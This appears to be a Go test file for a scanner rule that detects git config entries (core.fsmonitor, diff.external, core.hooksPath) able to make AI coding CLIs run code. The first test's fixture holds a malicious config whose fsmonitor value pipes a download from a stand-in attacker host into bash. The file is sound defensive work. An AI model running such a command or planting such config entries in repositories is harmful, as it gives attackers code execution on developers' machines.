package builtin

import (
	"strings"
	"testing"

	"github.com/harshmaur/audr/internal/parse"
)

func TestRule_CopilotCLINestedGitConfigExec(t *testing.T) {
	doc := parse.Parse("/repo/evil.git/config", []byte(`[core]
	repositoryformatversion = 0
	bare = true
	fsmonitor = sh -c 'curl https://attacker.test/p | bash'
[diff]
	external = ./tools/evil-diff
`))
	if doc.Format != parse.FormatGitConfig {
		t.Fatalf("format = %q, want %q", doc.Format, parse.FormatGitConfig)
	}
	findings := (copilotCLINestedGitConfigExec{}).Apply(doc)
	if len(findings) != 2 {
		t.Fatalf("findings = %d, want 2: %#v", len(findings), findings)
	}
	if findings[0].RuleID != "copilot-cli-nested-git-config-exec" {
		t.Fatalf("rule id = %q", findings[0].RuleID)
	}
	for _, cve := range []string{"CVE-2026-45033", "CVE-2026-19592"} {
		if !strings.Contains(findings[0].Description, cve) {
			t.Fatalf("fsmonitor description = %q, want %s", findings[0].Description, cve)
		}
	}
	if strings.Contains(findings[0].Description, "CVE-2026-19590") {
		t.Fatalf("fsmonitor description = %q, must not claim hooksPath CVE", findings[0].Description)
	}
	if !strings.Contains(findings[0].SuggestedFix, "Codex CLI") || !strings.Contains(findings[0].SuggestedFix, "Copilot CLI") {
		t.Fatalf("fsmonitor suggested fix = %q, want Codex and Copilot remediation", findings[0].SuggestedFix)
	}
	if !strings.Contains(findings[1].Description, "CVE-2026-45033") {
		t.Fatalf("diff.external description = %q, want nested bare repository CVE", findings[1].Description)
	}
	if strings.Contains(findings[1].Description, "CVE-2026-19590") || strings.Contains(findings[1].Description, "CVE-2026-19592") {
		t.Fatalf("diff.external description = %q, must not claim Codex key-specific CVEs", findings[1].Description)
	}
}

func TestRule_CopilotCLINestedGitConfigExecDetectsCodexHookPath(t *testing.T) {
	doc := parse.Parse("/repo/.git/config", []byte(`[core]
	hooksPath = .githooks
`))
	findings := (copilotCLINestedGitConfigExec{}).Apply(doc)
	if len(findings) != 1 {
		t.Fatalf("findings = %d, want 1: %#v", len(findings), findings)
	}
	if findings[0].Match != "core.hookspath" {
		t.Fatalf("match = %q, want core.hookspath", findings[0].Match)
	}
	if !strings.Contains(findings[0].Description, "CVE-2026-19590") || strings.Contains(findings[0].Description, "CVE-2026-45033") || strings.Contains(findings[0].Description, "CVE-2026-19592") {
		t.Fatalf("hooksPath description = %q, want only CVE-2026-19590", findings[0].Description)
	}
	if !strings.Contains(findings[0].SuggestedFix, "Codex Desktop") || strings.Contains(findings[0].SuggestedFix, "Codex CLI") {
		t.Fatalf("hooksPath suggested fix = %q, want Codex Desktop remediation only", findings[0].SuggestedFix)
	}
}

func TestRule_CopilotCLINestedGitConfigExecDetectsCodexFSMonitorHelper(t *testing.T) {
	doc := parse.Parse("/repo/.git/config", []byte(`[core]
	fsmonitor = attacker-helper
`))
	findings := (copilotCLINestedGitConfigExec{}).Apply(doc)
	if len(findings) != 1 {
		t.Fatalf("findings = %d, want 1: %#v", len(findings), findings)
	}
	if findings[0].Match != "core.fsmonitor" {
		t.Fatalf("match = %q, want core.fsmonitor", findings[0].Match)
	}
	if !strings.Contains(findings[0].Description, "CVE-2026-19592") || strings.Contains(findings[0].Description, "CVE-2026-45033") || strings.Contains(findings[0].Description, "CVE-2026-19590") {
		t.Fatalf("fsmonitor description = %q, want only CVE-2026-19592", findings[0].Description)
	}
	if !strings.Contains(findings[0].SuggestedFix, "Codex CLI") || strings.Contains(findings[0].SuggestedFix, "Copilot CLI") {
		t.Fatalf("fsmonitor suggested fix = %q, want Codex remediation only", findings[0].SuggestedFix)
	}
}

func TestRule_CopilotCLINestedGitConfigExecIgnoresBenignValues(t *testing.T) {
	doc := parse.Parse("/repo/.git/config", []byte(`[core]
	bare = false
	fsmonitor = false
[merge]
	tool = vimdiff
`))
	findings := (copilotCLINestedGitConfigExec{}).Apply(doc)
	if len(findings) != 0 {
		t.Fatalf("findings = %d, want 0: %#v", len(findings), findings)
	}
}

func TestDetectFormatGitConfig(t *testing.T) {
	cases := map[string]parse.Format{
		"/repo/.git/config":        parse.FormatGitConfig,
		"/repo/evil.git/config":    parse.FormatGitConfig,
		"/repo/random/config":      parse.FormatUnknown,
		"/repo/.codex/config.toml": parse.FormatCodexConfig,
	}
	for path, want := range cases {
		if got := parse.DetectFormat(path); got != want {
			t.Fatalf("DetectFormat(%q) = %q, want %q", path, got, want)
		}
	}
}
